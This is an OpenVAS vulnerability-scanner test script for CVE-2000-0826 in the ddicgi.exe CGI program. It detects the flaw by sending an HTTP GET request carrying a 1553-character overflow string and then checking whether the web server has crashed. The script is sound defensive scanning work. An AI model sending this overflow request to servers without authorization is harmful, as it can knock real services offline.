# OpenVAS Vulnerability Test
# Description: ddicgi.exe vulnerability
#
# Authors:
# John Lampe <j_lampe@bellsouth.net>
#
# Copyright:
# Copyright (C) 2003 John Lampe
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11728");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1657);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2000-0826");
  script_name("ddicgi.exe vulnerability");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2003 John Lampe");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"The file ddicgi.exe exists on this webserver.
  Some versions of this file are vulnerable to remote exploit.");

  script_tag(name:"impact", value:"An attacker may use this file to gain access to confidential data
  or escalate their privileges on the Web server.");

  script_tag(name:"solution", value:"Remove it from the cgi-bin or scripts directory.");

  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(http_is_cgi_installed_ka(item:"/ddrint/bin/ddicgi.exe", port:port)) {

  if(http_is_dead(port:port))
    exit(0);

  soc = open_sock_tcp(port);
  if(soc) {
    req = string("GET /ddrint/bin/ddicgi.exe?", crap(1553), "=X HTTP/1.0\r\n\r\n");
    send(socket:soc, data:req);
    r = http_recv(socket:soc);
    close(soc);
    if(http_is_dead(port:port)) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(0);
